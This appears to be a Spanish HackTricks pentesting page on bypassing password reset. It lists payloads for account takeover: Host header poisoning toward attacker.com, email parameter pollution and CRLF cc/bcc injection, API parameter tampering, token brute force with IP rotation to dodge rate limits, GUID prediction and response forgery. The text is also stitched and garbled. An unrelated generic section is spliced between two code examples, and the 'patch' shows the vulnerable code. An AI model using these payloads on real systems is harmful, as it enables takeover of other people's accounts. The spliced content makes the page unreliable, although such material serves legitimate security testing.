# Bypass de Restablecimiento/Olvido de Contrase√±a

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendr√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en la leyenda del hacker web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) ¬°comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

Las siguientes t√©cnicas de recompilaci√≥n fueron tomadas de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Fuga de Token de Restablecimiento de Contrase√±a a trav√©s del Referer

El **referer HTTP** es un campo de encabezado HTTP opcional que identifica la direcci√≥n de la p√°gina web que est√° vinculada al recurso que se solicita. El encabezado de solicitud Referer contiene la direcci√≥n de la p√°gina web anterior desde la cual se sigui√≥ un enlace a la p√°gina actualmente solicitada.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### Explotaci√≥n

* Solicita el restablecimiento de contrase√±a a tu direcci√≥n de correo electr√≥nico
* Haz clic en el enlace de restablecimiento de contrase√±a
* No cambies la contrase√±a
* Haz clic en cualquier sitio web de terceros (por ejemplo: Facebook, Twitter)
* Intercepta la solicitud en el proxy de Burp Suite
* Verifica si el encabezado referer est√° filtrando el token de restablecimiento de contrase√±a.

### Impacto

Permite a la persona que tiene el control de un sitio en particular cambiar la contrase√±a del usuario (ataque CSRF), porque esta persona conoce el token de restablecimiento de contrase√±a del usuario.

### Referencia:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Envenenamiento de Restablecimiento de Contrase√±a

¬°Si encuentras un ataque de encabezado de host y est√° fuera del alcance, intenta encontrar el bot√≥n de restablecimiento de contrase√±a!

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Explotaci√≥n

* Intercepta la solicitud de restablecimiento de contrase√±a en Burp Suite
* Agrega el siguiente encabezado o edita el encabezado en Burp Suite (prueba uno por uno)
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* Verificar si el enlace para cambiar la contrase√±a dentro del correo electr√≥nico apunta a attacker.com

### Parche

Usar `$_SERVER['SERVER_NAME']` en lugar de `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impacto

La v√≠ctima recibir√° el enlace malicioso en su correo electr√≥nico y, al hacer clic, filtrar√° el enlace / token de restablecimiento de contrase√±a del usuario al atacante, lo que llevar√° a la toma completa de la cuenta.

### Referencia:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## Restablecimiento de contrase√±a manipulando el par√°metro de correo electr√≥nico

### Explotaci√≥n

* Agregar el correo electr√≥nico del atacante como segundo par√°metro usando &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Agrega el correo electr√≥nico del atacante como segundo par√°metro usando %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Agregar el correo electr√≥nico del atacante como segundo par√°metro usando |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Agregar el correo electr√≥nico del atacante como segundo par√°metro usando cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Agregar el correo electr√≥nico del atacante como segundo par√°metro usando bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Agrega el correo electr√≥nico del atacante como segundo par√°metro usando ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Agregar el correo electr√≥nico del atacante como segundo par√°metro en el arreglo json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### Referencia

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Cambiar el correo electr√≥nico y la contrase√±a de cualquier usuario a trav√©s de los par√°metros de la API

### Explotaci√≥n

* El atacante debe iniciar sesi√≥n con su cuenta e ir a la funci√≥n de cambio de contrase√±a
* Iniciar Burp Suite y interceptar la solicitud
* Despu√©s de interceptar la solicitud, enviarla al repetidor y modificar los par√°metros de correo electr√≥nico y contrase√±a
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### Referencia

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Sin l√≠mite de velocidad: bombardeo de correos electr√≥nicos <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### Explotaci√≥n

* Inicie Burp Suite e intercepte la solicitud de restablecimiento de contrase√±a
* Env√≠elo a Intruder
* Use una carga √∫til nula

### Referencia

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## Descubra c√≥mo se genera el token de restablecimiento de contrase√±a

Descubra el patr√≥n del token de restablecimiento de contrase√±a

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Si se

* Genera en funci√≥n de la marca de tiempo
* Genera en funci√≥n del ID de usuario
* Genera en funci√≥n del correo electr√≥nico del usuario
* Genera en funci√≥n del nombre y apellido
* Genera en funci√≥n de la fecha de nacimiento
* Genera en funci√≥n de la criptograf√≠a

Use Burp Sequencer para encontrar la aleatoriedad o previsibilidad de los tokens.

## GUID adivinable

Existen diferentes tipos de GUID:

* **Versi√≥n 0:** Solo se ve en el GUID nulo ("00000000-0000-0000-0000-000000000000").
* **Versi√≥n 1:** El GUID se genera de manera predecible en funci√≥n de:
* La hora actual
* Una "secuencia de reloj" generada aleatoriamente que permanece constante entre GUID durante el tiempo de actividad del sistema generador
* Un "ID de nodo", que se genera en funci√≥n de la direcci√≥n MAC del sistema si est√° disponible
* **Versi√≥n 3:** El GUID se genera utilizando un hash MD5 de un nombre y un espacio de nombres proporcionados.
* **Versi√≥n 4:** El GUID se genera de forma aleatoria.
* **Versi√≥n 5:** El GUID se genera utilizando un hash SHA1 de un nombre y un espacio de nombres proporcionados.

Es posible echar un vistazo a un GUID y descubrir su versi√≥n, hay una peque√±a herramienta para eso: [**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Si se utiliza la versi√≥n 1 para generar un GUID de restablecimiento de contrase√±a, es posible realizar un ataque de fuerza bruta a los GUIDs:
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### Referencias

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## Manipulaci√≥n de respuesta: Reemplazar una respuesta incorrecta por una correcta

Busque solicitudes y respuestas como estas
```php
HTTP/1.1 401 Unauthorized
(‚Äúmessage‚Äù:‚Äùunsuccessful‚Äù,‚ÄùstatusCode:403,‚ÄùerrorDescription‚Äù:‚ÄùUnsuccessful‚Äù)
```
# Restablecimiento de contrase√±a

Cuando se realiza una prueba de penetraci√≥n en una aplicaci√≥n web, una de las √°reas clave a evaluar es el proceso de restablecimiento de contrase√±a. Este proceso es cr√≠tico ya que, si se implementa de manera incorrecta, puede permitir a un atacante obtener acceso no autorizado a la cuenta de un usuario.

## Identificaci√≥n de debilidades

Durante la fase de identificaci√≥n de debilidades, es importante buscar posibles vulnerabilidades en el proceso de restablecimiento de contrase√±a. Algunas de las debilidades comunes incluyen:

- **Fuerza bruta**: La falta de medidas de protecci√≥n contra ataques de fuerza bruta puede permitir a un atacante adivinar contrase√±as d√©biles o predecibles.
- **Preguntas de seguridad d√©biles**: Las preguntas de seguridad d√©biles o predecibles pueden permitir a un atacante obtener respuestas f√°cilmente y restablecer la contrase√±a.
- **Enlaces de restablecimiento de contrase√±a inseguros**: Los enlaces de restablecimiento de contrase√±a que no est√°n protegidos adecuadamente pueden ser interceptados por un atacante y utilizados para restablecer la contrase√±a de un usuario leg√≠timo.
- **Falta de l√≠mites en los intentos de restablecimiento**: La falta de l√≠mites en los intentos de restablecimiento de contrase√±a puede permitir a un atacante realizar ataques de fuerza bruta sin restricciones.

## Explotaci√≥n de debilidades

Una vez identificadas las debilidades en el proceso de restablecimiento de contrase√±a, se pueden explotar de varias formas:

- **Ataques de fuerza bruta**: Se pueden utilizar herramientas automatizadas para realizar ataques de fuerza bruta y adivinar contrase√±as d√©biles o predecibles.
- **Suplantaci√≥n de identidad**: Si se pueden obtener respuestas a las preguntas de seguridad o interceptar enlaces de restablecimiento de contrase√±a, se puede suplantar la identidad del usuario leg√≠timo y restablecer su contrase√±a.
- **Ataques de interceptaci√≥n**: Si los enlaces de restablecimiento de contrase√±a no est√°n protegidos adecuadamente, se pueden interceptar y utilizar para restablecer la contrase√±a de un usuario leg√≠timo.

## Recomendaciones de seguridad

Para proteger el proceso de restablecimiento de contrase√±a, se recomienda seguir estas mejores pr√°cticas:

- **Implementar medidas de protecci√≥n contra ataques de fuerza bruta**: Esto puede incluir la implementaci√≥n de bloqueos temporales despu√©s de varios intentos fallidos de restablecimiento de contrase√±a.
- **Utilizar preguntas de seguridad fuertes**: Las preguntas de seguridad deben ser dif√≠ciles de adivinar y no estar relacionadas con informaci√≥n f√°cilmente accesible.
- **Proteger los enlaces de restablecimiento de contrase√±a**: Los enlaces de restablecimiento de contrase√±a deben ser √∫nicos, de un solo uso y estar protegidos mediante cifrado o tokens de seguridad.
- **Limitar los intentos de restablecimiento**: Se deben establecer l√≠mites en los intentos de restablecimiento de contrase√±a para evitar ataques de fuerza bruta.

Al seguir estas recomendaciones, se puede fortalecer la seguridad del proceso de restablecimiento de contrase√±a y proteger la informaci√≥n confidencial de los usuarios.
```php
HTTP/1.1 200 OK
(‚Äúmessage‚Äù:‚Äùsuccess‚Äù,‚ÄùstatusCode:200,‚ÄùerrorDescription‚Äù:‚ÄùSuccess‚Äù)
```
### Referencia

* https://medium.com/@innocenthacker/c√≥mo-encontr√©-el-bug-m√°s-cr√≠tico-en-un-evento-de-recompensa-por-errores-en-vivo-7a88b3aa97b3

### Usando un Token Expirado <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* Verificar si el token expirado puede ser reutilizado

### Fuerza Bruta en el Token de Restablecimiento de Contrase√±a <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Intentar realizar un ataque de fuerza bruta en el token de restablecimiento utilizando Burpsuite
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Utiliza IP-Rotator en burpsuite para evadir el l√≠mite de velocidad basado en IP.

### Referencia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Intenta Usar Tu Token <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Intenta agregar tu token de restablecimiento de contrase√±a junto con la cuenta de la v√≠ctima.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### Referencia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Invalidaci√≥n de sesi√≥n en cierre de sesi√≥n/restablecimiento de contrase√±a

Cuando un usuario cierra sesi√≥n o restablece su contrase√±a, la sesi√≥n actual debe ser invalidada.\
Por lo tanto, **captura las cookies** mientras el usuario est√° conectado, **cierra sesi√≥n** y **verifica** si las **cookies** siguen siendo **v√°lidas**.\
Repite el proceso **cambiando la contrase√±a** en lugar de cerrar sesi√≥n.

## Tiempo de expiraci√≥n del token de restablecimiento

Los **tokens de restablecimiento deben tener un tiempo de expiraci√≥n**, despu√©s de eso el token no deber√≠a ser v√°lido para cambiar la contrase√±a de un usuario.

## Verificaciones adicionales

* Utiliza username@burp\_collab.net y analiza la devoluci√≥n de llamada
* Usuario con copia oculta de correo electr√≥nico=victim@mail.com%0a%0dcc:hacker@mail.com
* Una contrase√±a larga (>200) provoca una denegaci√≥n de servicio (DoS)
* Agrega un segundo par√°metro y valor de correo electr√≥nico

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendr√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos de blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en la leyenda del hacker web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) y comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
